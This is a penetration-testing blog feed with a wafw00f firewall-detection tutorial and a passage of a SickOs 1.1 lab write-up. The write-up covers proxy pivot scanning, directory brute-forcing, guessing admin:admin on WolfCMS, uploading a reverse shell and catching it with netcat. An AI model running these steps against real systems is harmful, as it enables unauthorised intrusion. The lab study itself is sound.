    <title type="html"><![CDATA[wafw00f - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/30/wafw00f-kali-linux-tools/"/>
    <updated>2017-06-30T04:46:55-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/30/wafw00f-kali-linux-tools</id>
    <content type="html"><![CDATA[<p><strong>Objective</strong>: you need to establish if a web application firewall is in place, and ideally, what type of WAF it is. You can go bark at it with wafw00f!</p>

<p>Homepage: <a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></p>

<!-- more -->


<h2>wafw00f description</h2>

<blockquote><p>WAFW00F identifies and fingerprints Web Application Firewall (WAF) products.</p>

<p>How does it work?</p>

<p>To do its magic, WAFW00F does the following:</p>

<p> Sends a normal HTTP request and analyses the response; this identifies a number of WAF solutions</p>

<p> If that is not successful, it sends a number of (potentially malicious) HTTP requests and uses simple logic to
deduce which WAF it is</p>

<p> If that is also not successful, it analyses the responses previously returned and uses another simple algorithm
to guess if a WAF or security solution is actively responding to our attacks</p></blockquote>

<h2>wafw00f options</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wafw00f -h
</span><span class='line'>
</span><span class='line'>                                 ^     ^
</span><span class='line'>        _   __  _   ____ _   __  _    _   ____
</span><span class='line'>       ///7/ /.' \ / __////7/ /,' \ ,' \ / __/
</span><span class='line'>      | V V // o // _/ | V V // 0 // 0 // _/
</span><span class='line'>      |_n_,'/_n_//_/   |_n_,' \_,' \_,'/_/
</span><span class='line'>                                &lt;
</span><span class='line'>                                 ...'
</span><span class='line'>
</span><span class='line'>    WAFW00F - Web Application Firewall Detection Tool
</span><span class='line'>
</span><span class='line'>    By Sandro Gauci && Wendel G. Henrique
</span><span class='line'>
</span><span class='line'>Usage: wafw00f url1 [url2 [url3 ... ]]
</span><span class='line'>example: wafw00f http://www.victim.org/
</span><span class='line'>
</span><span class='line'>Options:
</span><span class='line'>  -h, --help            show this help message and exit
</span><span class='line'>  -v, --verbose         enable verbosity - multiple -v options increase
</span><span class='line'>                        verbosity
</span><span class='line'>  -a, --findall         Find all WAFs, do not stop testing on the first one
</span><span class='line'>  -r, --disableredirect
</span><span class='line'>                        Do not follow redirections given by 3xx responses
</span><span class='line'>  -t TEST, --test=TEST  Test for one specific WAF
</span><span class='line'>  -l, --list            List all WAFs that we are able to detect
</span><span class='line'>  --xmlrpc              Switch on the XML-RPC interface instead of CUI
</span><span class='line'>  --xmlrpcport=XMLRPCPORT
</span><span class='line'>                        Specify an alternative port to listen on, default 8001
</span><span class='line'>  -V, --version         Print out the version</span></code></pre></td></tr></table></div></figure>


<h2>wafw00f usage</h2>

<ul>
<li>see what WAFs it can detect at the moment</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wafw00f -l
</span><span class='line'>
</span><span class='line'>                                 ^     ^
</span><span class='line'>        _   __  _   ____ _   __  _    _   ____
</span><span class='line'>       ///7/ /.' \ / __////7/ /,' \ ,' \ / __/
</span><span class='line'>      | V V // o // _/ | V V // 0 // 0 // _/
</span><span class='line'>      |_n_,'/_n_//_/   |_n_,' \_,' \_,'/_/
</span><span class='line'>                                &lt;
</span><span class='line'>                                 ...'
</span><span class='line'>
</span><span class='line'>    WAFW00F - Web Application Firewall Detection Tool
</span><span class='line'>
</span><span class='line'>    By Sandro Gauci && Wendel G. Henrique
</span><span class='line'>
</span><span class='line'>Can test for these WAFs:
</span><span class='line'>
</span><span class='line'>Profense
</span><span class='line'>NetContinuum
</span><span class='line'>Incapsula WAF
</span><span class='line'>CloudFlare
</span><span class='line'>USP Secure Entry Server
</span><span class='line'>Cisco ACE XML Gateway
</span><span class='line'>Barracuda Application Firewall
</span><span class='line'>Art of Defence HyperGuard
</span><span class='line'>BinarySec
</span><span class='line'>Teros WAF
</span><span class='line'>F5 BIG-IP LTM
</span><span class='line'>F5 BIG-IP APM
</span><span class='line'>F5 BIG-IP ASM
</span><span class='line'>F5 FirePass
</span><span class='line'>F5 Trafficshield
</span><span class='line'>InfoGuard Airlock
</span><span class='line'>Citrix NetScaler
</span><span class='line'>Trustwave ModSecurity
</span><span class='line'>IBM Web Application Security
</span><span class='line'>IBM DataPower
</span><span class='line'>DenyALL WAF
</span><span class='line'>Applicure dotDefender
</span><span class='line'>Juniper WebApp Secure
</span><span class='line'>Microsoft URLScan
</span><span class='line'>Aqtronix WebKnight
</span><span class='line'>eEye Digital Security SecureIIS
</span><span class='line'>Imperva SecureSphere
</span><span class='line'>Microsoft ISA Server</span></code></pre></td></tr></table></div></figure>


<ul>
<li>detect WAF</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wafw00f https://bugcrowd.com
</span><span class='line'>
</span><span class='line'>                                 ^     ^
</span><span class='line'>        _   __  _   ____ _   __  _    _   ____
</span><span class='line'>       ///7/ /.' \ / __////7/ /,' \ ,' \ / __/
</span><span class='line'>      | V V // o // _/ | V V // 0 // 0 // _/
</span><span class='line'>      |_n_,'/_n_//_/   |_n_,' \_,' \_,'/_/
</span><span class='line'>                                &lt;
</span><span class='line'>                                 ...'
</span><span class='line'>
</span><span class='line'>    WAFW00F - Web Application Firewall Detection Tool
</span><span class='line'>
</span><span class='line'>    By Sandro Gauci && Wendel G. Henrique
</span><span class='line'>
</span><span class='line'>Checking https://bugcrowd.com
</span><span class='line'>The site https://bugcrowd.com is behind a CloudFlare
</span><span class='line'>Number of requests: 1</span></code></pre></td></tr></table></div></figure>


<ul>
<li>not detecting WAF</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wafw00f cisco.com
</span><span class='line'>
</span><span class='line'>                                 ^     ^
</span><span class='line'>        _   __  _   ____ _   __  _    _   ____
</span><span class='line'>       ///7/ /.' \ / __////7/ /,' \ ,' \ / __/
</span><span class='line'>      | V V // o // _/ | V V // 0 // 0 // _/
</span><span class='line'>      |_n_,'/_n_//_/   |_n_,' \_,' \_,'/_/
</span><span class='line'>                                &lt;
</span><span class='line'>                                 ...'
</span><span class='line'>
</span><span class='line'>    WAFW00F - Web Application Firewall Detection Tool
</span><span class='line'>
</span><span class='line'>    By Sandro Gauci && Wendel G. Henrique
</span><span class='line'>
</span><span class='line'>Checking http://cisco.com
</span><span class='line'>Generic Detection results:
</span><span class='line'>No WAF detected by the generic detection
</span><span class='line'>Number of requests: 13</span></code></pre></td></tr></table></div></figure>


<ul>
<li>establish there is a WAF but without detecting its type</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wafw00f -a microsoft.com
</span><span class='line'>
</span><span class='line'>                                 ^     ^
</span><span class='line'>        _   __  _   ____ _   __  _    _   ____
</span><span class='line'>       ///7/ /.' \ / __////7/ /,' \ ,' \ / __/
</span><span class='line'>      | V V // o // _/ | V V // 0 // 0 // _/
</span><span class='line'>      |_n_,'/_n_//_/   |_n_,' \_,' \_,'/_/
</span><span class='line'>                                &lt;
</span><span class='line'>                                 ...'
</span><span class='line'>
</span><span class='line'>    WAFW00F - Web Application Firewall Detection Tool
</span><span class='line'>
</span><span class='line'>    By Sandro Gauci && Wendel G. Henrique
</span><span class='line'>
</span><span class='line'>Checking http://microsoft.com
</span><span class='line'>Generic Detection results:
</span><span class='line'>The site http://microsoft.com seems to be behind a WAF or some sort of security solution
</span><span class='line'>Reason: The server returned a different response code when a string trigged the blacklist.
</span><span class='line'>Normal response code is "400", while the response code to an attack is "301"
</span><span class='line'>Number of requests: 13</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _______________________________________
</span><span class='line'>/ You'll wish that you had done some of \
</span><span class='line'>| the hard things when they were easier |
</span><span class='line'>\ to do.                                /
</span><span class='line'> ---------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SickOs 1.1 writeup]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/28/sickos-1-dot-1-writeup/"/>
    <updated>2017-06-28T08:09:14-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/28/sickos-1-dot-1-writeup</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s target is similar to what can be found in OSCP labs. The goal is to obtain root privileges and get the flag. Let&rsquo;s dive right in!</p>

<!-- more -->


<h2>Recon</h2>

<p>Nmap results are:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -T4 -p- -A 192.168.217.143
</span><span class='line'>
</span><span class='line'>PORT     STATE  SERVICE    VERSION
</span><span class='line'>22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
</span><span class='line'>| ssh-hostkey: 
</span><span class='line'>|   1024 09:3d:29:a0:da:48:14:c1:65:14:1e:6a:6c:37:04:09 (DSA)
</span><span class='line'>|   2048 84:63:e9:a8:8e:99:33:48:db:f6:d5:81:ab:f2:08:ec (RSA)
</span><span class='line'>|_  256 51:f6:eb:09:f6:b3:e6:91:ae:36:37:0c:c8:ee:34:27 (ECDSA)
</span><span class='line'>3128/tcp open   http-proxy Squid http proxy 3.1.19
</span><span class='line'>| http-open-proxy: Potentially OPEN proxy.
</span><span class='line'>|_Methods supported: GET HEAD
</span><span class='line'>|_http-server-header: squid/3.1.19
</span><span class='line'>|_http-title: ERROR: The requested URL could not be retrieved
</span><span class='line'>8080/tcp closed http-proxy</span></code></pre></td></tr></table></div></figure>


<p>This is an interesting one, there are no obvious points of entry, but there is a Squid proxy in place. Navigating directly to port 3128 didn&rsquo;t yield anything besides an error of an invalid URL request. I googled the Squid version and found a potentially useful <a href="https://www.rapid7.com/db/modules/auxiliary/scanner/http/squid_pivot_scanning">Metasploit module</a>:</p>

<blockquote><p>A misconfigured Squid proxy can allow an attacker to make requests on his behalf. This may give the attacker
information about devices that he cannot reach but the Squid proxy can. For example, an attacker can make requests
for internal IP addresses against a misconfigurated open Squid proxy exposed to the Internet, therefore performing an
internal port scan. The error messages returned by the proxy are used to determine if the port is open or not. Many
Squid proxies use custom error codes so your mileage may vary. The open_proxy module can be used to test for open
proxies, though a Squid proxy does not have to be open in order to allow for pivoting (e.g. an Intranet Squid proxy
which allows the attack to pivot to another part of the network).</p></blockquote>

<p>Here are the options I&rsquo;ve used for the scanner:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf auxiliary(squid_pivot_scanning) &gt; options
</span><span class='line'>
</span><span class='line'>Module options (auxiliary/scanner/http/squid_pivot_scanning):
</span><span class='line'>
</span><span class='line'>   Name          Current Setting                                  Required  Description
</span><span class='line'>   ----          ---------------                                  --------  -----------
</span><span class='line'>   CANARY_IP     1.2.3.4                                          yes       The IP to check if the proxy always answers positively; the IP should not respond.
</span><span class='line'>   MANUAL_CHECK  true                                             yes       Stop the scan if server seems to answer positively to every request
</span><span class='line'>   PORTS         21,80,139,443,445,1433,1521,1723,3389,8080,9100  yes       Ports to scan; must be TCP
</span><span class='line'>   Proxies                                                        no        A proxy chain of format type:host:port[,type:host:port][...]
</span><span class='line'>   RANGE         192.168.217.143                                  yes       IPs to scan through Squid proxy
</span><span class='line'>   RHOSTS        192.168.217.143                                  yes       The target address range or CIDR identifier
</span><span class='line'>   RPORT         3128                                             yes       The target port (TCP)
</span><span class='line'>   SSL           false                                            no        Negotiate SSL/TLS for outgoing connections
</span><span class='line'>   THREADS       1                                                yes       The number of concurrent threads
</span><span class='line'>   VHOST                                                          no        HTTP server virtual host</span></code></pre></td></tr></table></div></figure>


<p>And the output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf auxiliary(squid_pivot_scanning) &gt; run
</span><span class='line'>
</span><span class='line'>[+] [192.168.217.143] 192.168.217.143 is alive but 21 is CLOSED
</span><span class='line'>[+] [192.168.217.143] 192.168.217.143:80 seems OPEN
</span><span class='line'>[+] [192.168.217.143] 192.168.217.143 is alive but 139 is CLOSED
</span><span class='line'>[+] [192.168.217.143] 192.168.217.143 is alive but 445 is CLOSED
</span><span class='line'>[+] [192.168.217.143] 192.168.217.143 is alive but 1433 is CLOSED
</span><span class='line'>[+] [192.168.217.143] 192.168.217.143 is alive but 1521 is CLOSED
</span><span class='line'>[+] [192.168.217.143] 192.168.217.143 is alive but 1723 is CLOSED
</span><span class='line'>[+] [192.168.217.143] 192.168.217.143 is alive but 3389 is CLOSED
</span><span class='line'>[+] [192.168.217.143] 192.168.217.143 is alive but 8080 is CLOSED
</span><span class='line'>[+] [192.168.217.143] 192.168.217.143 is alive but 9100 is CLOSED
</span><span class='line'>[*] Scanned 1 of 1 hosts (100% complete)
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>


<p>It appears port 80 is open on the target. I configured my browser to use the Squid proxy and went to the web server:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/sickos/1-web.png" title="web server" alt="webpage"></p>

<p>If it doesn&rsquo;t appear there is much content on the web server, we have to get more information by force _;) Since I had to take the proxy into consideration, I preferred a CLI tool rather than a GUI like Dirbuster. How fortunate that there is a CLI companion to Dirbuster, called <em>sound of drums</em>: <strong>dirb</strong>!</p>

<h3>dirb description</h3>

<p>Homepage: <a href="http://dirb.sourceforge.net/">http://dirb.sourceforge.net/</a></p>

<blockquote><p>DIRB is a Web Content Scanner. It looks for existing (and/or hidden) Web
Objects. It basically works by launching a dictionary based attack against
a web server and analizing the response.</p>

<p>DIRB comes with a set of preconfigured attack wordlists for easy usage but
you can use your custom wordlists. Also DIRB sometimes can be used as a
classic CGI scanner, but remember is a content scanner not a vulnerability scanner.</p>

<p>DIRB main purpose is to help in professional web application auditing.
Specially in security related testing. It covers some holes not covered by
classic web vulnerability scanners. DIRB looks for specific web objects that
other generic CGI scanners can&rsquo;t look for. It doesn&rsquo;t search vulnerabilities
nor does it look for web contents that can be vulnerables.</p></blockquote>

<h3>dirb options</h3>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-----------------
</span><span class='line'>DIRB v2.22    
</span><span class='line'>By The Dark Raver
</span><span class='line'>-----------------
</span><span class='line'>
</span><span class='line'>./dirb &lt;url_base&gt; [&lt;wordlist_file(s)&gt;] [options]
</span><span class='line'>
</span><span class='line'>========================= NOTES =========================
</span><span class='line'> &lt;url_base&gt; : Base URL to scan. (Use -resume for session resuming)
</span><span class='line'> &lt;wordlist_file(s)&gt; : List of wordfiles. (wordfile1,wordfile2,wordfile3...)
</span><span class='line'>
</span><span class='line'>======================== HOTKEYS ========================
</span><span class='line'> 'n' -&gt; Go to next directory.
</span><span class='line'> 'q' -&gt; Stop scan. (Saving state for resume)
</span><span class='line'> 'r' -&gt; Remaining scan stats.
</span><span class='line'>
</span><span class='line'>======================== OPTIONS ========================
</span><span class='line'> -a &lt;agent_string&gt; : Specify your custom USER_AGENT.
</span><span class='line'> -c &lt;cookie_string&gt; : Set a cookie for the HTTP request.
</span><span class='line'> -f : Fine tunning of NOT_FOUND (404) detection.
</span><span class='line'> -H &lt;header_string&gt; : Add a custom header to the HTTP request.
</span><span class='line'> -i : Use case-insensitive search.
</span><span class='line'> -l : Print "Location" header when found.
</span><span class='line'> -N &lt;nf_code&gt;: Ignore responses with this HTTP code.
</span><span class='line'> -o &lt;output_file&gt; : Save output to disk.
</span><span class='line'> -p &lt;proxy[:port]&gt; : Use this proxy. (Default port is 1080)
</span><span class='line'> -P &lt;proxy_username:proxy_password&gt; : Proxy Authentication.
</span><span class='line'> -r : Don't search recursively.
</span><span class='line'> -R : Interactive recursion. (Asks for each directory)
</span><span class='line'> -S : Silent Mode. Don't show tested words. (For dumb terminals)
</span><span class='line'> -t : Don't force an ending '/' on URLs.
</span><span class='line'> -u &lt;username:password&gt; : HTTP Authentication.
</span><span class='line'> -v : Show also NOT_FOUND pages.
</span><span class='line'> -w : Don't stop on WARNING messages.
</span><span class='line'> -X &lt;extensions&gt; / -x &lt;exts_file&gt; : Append each word with this extensions.
</span><span class='line'> -z &lt;milisecs&gt; : Add a miliseconds delay to not cause excessive Flood.
</span><span class='line'>
</span><span class='line'>======================== EXAMPLES =======================
</span><span class='line'> ./dirb http://url/directory/ (Simple Test)
</span><span class='line'> ./dirb http://url/ -X .html (Test files with '.html' extension)
</span><span class='line'> ./dirb http://url/ /usr/share/dirb/wordlists/vulns/apache.txt (Test with apache.txt wordlist)
</span><span class='line'> ./dirb https://secure_url/ (Simple Test with SSL)</span></code></pre></td></tr></table></div></figure>


<p>This tool is exactly what I needed! And it finished really fast! Here are its discoveries:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dirb http://192.168.217.143 /usr/share/wordlists/dirb/common.txt -p 192.168.217.143:3128
</span><span class='line'>
</span><span class='line'>-----------------
</span><span class='line'>DIRB v2.22    
</span><span class='line'>By The Dark Raver
</span><span class='line'>-----------------
</span><span class='line'>
</span><span class='line'>START_TIME: Thu Jun 29 06:45:12 2017
</span><span class='line'>URL_BASE: http://192.168.217.143/
</span><span class='line'>WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt
</span><span class='line'>PROXY: 192.168.217.143:3128
</span><span class='line'>
</span><span class='line'>-----------------
</span><span class='line'>
</span><span class='line'>GENERATED WORDS: 4612                                                          
</span><span class='line'>
</span><span class='line'>---- Scanning URL: http://192.168.217.143/ ----
</span><span class='line'>+ http://192.168.217.143/cgi-bin/ (CODE:403|SIZE:291)                                                                                               
</span><span class='line'>+ http://192.168.217.143/connect (CODE:200|SIZE:109)                                                                                                
</span><span class='line'>+ http://192.168.217.143/index (CODE:200|SIZE:21)                                                                                                   
</span><span class='line'>+ http://192.168.217.143/index.php (CODE:200|SIZE:21)                                                                                               
</span><span class='line'>+ http://192.168.217.143/robots (CODE:200|SIZE:45)                                                                                                  
</span><span class='line'>+ http://192.168.217.143/robots.txt (CODE:200|SIZE:45)                                                                                              
</span><span class='line'>+ http://192.168.217.143/server-status (CODE:403|SIZE:296)                                                                                          
</span><span class='line'>                                                                                                                                                    
</span><span class='line'>-----------------
</span><span class='line'>END_TIME: Thu Jun 29 06:45:16 2017
</span><span class='line'>DOWNLOADED: 4612 - FOUND: 7</span></code></pre></td></tr></table></div></figure>


<p>Quite interesting. Some resources are forbidden, connect is a Python script with the following content:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#!/usr/bin/python
</span><span class='line'>
</span><span class='line'>print "I Try to connect things very frequently\n"
</span><span class='line'>print "You may want to try my services"</span></code></pre></td></tr></table></div></figure>


<p>The robots.txt file seems the most useful:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>User-agent: *
</span><span class='line'>Disallow: /
</span><span class='line'>Dissalow: /wolfcms</span></code></pre></td></tr></table></div></figure>


<p>A hidden CMS, eh? I went there to find this:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/sickos/1-wolfcms.png" title="wolfcms" alt="wolfcms"></p>

<p>I ran Nikto on it, didn&rsquo;t find anything interesting besides an outdated Apache version. Same with other scanners and another round of directory bruteforcing, nothing useful. I googled for WolfCMS, and found an arbitrary file upload exploit, but it required an authenticated user. So next I searched for the admin interface, and found an answer on <a href="https://www.wolfcms.org/forum/topic2034.html">their forums</a>. So I appended <em>?admin</em> to the path and got redirected to <a href="http://192.168.217.143/wolfcms/?/admin/login">http://192.168.217.143/wolfcms/?/admin/login</a></p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/sickos/1-login.png" title="wolfcms admin" alt="wolfcms admin login"></p>

<p>I couldn&rsquo;t find default credentials, no obvious SQL errors, so I tried a few common combinations, and imagine the surprise when <em>admin:admin</em> worked!</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/sickos/1-admin.png" title="admin" alt="wolfcms admin panel"></p>

<h2>Exploitation</h2>

<p>Now I can use the <a href="https://www.exploit-db.com/exploits/36818/">exploit</a>. The vulnerability exists in the CMS&#8217; File Manager, which doesn&rsquo;t restrict the types of files that can be uploaded. But I forgot that I had to access the CMS through a proxy, and didn&rsquo;t want to modify the code, so instead I manually uploaded Pentestmonkey&rsquo;s reverse shell through the interface:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/sickos/1-file.png" title="file manager" alt="wolfcms file upload"></p>

<p>I set up a Netcat listener and navigated to the shell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nc -vnlp 8888
</span><span class='line'>listening on [any] 8888 ...
</span><span class='line'>connect to [192.168.217.132] from (UNKNOWN) [192.168.217.143] 33709
</span><span class='line'>Linux SickOs 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
</span><span class='line'> 18:12:38 up  3:14,  0 users,  load average: 0.00, 0.01, 0.05
</span><span class='line'>USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span><span class='line'>/bin/sh: 0: can't access tty; job control turned off
</span><span class='line'>$ whoami
</span><span class='line'>www-data</span></code></pre></td></tr></table></div></figure>


<p>I looked inside the web directory and found a <strong>config.php</strong> file in <code>/var/www/wolfcms</code> that contained a set of credentials:</p>

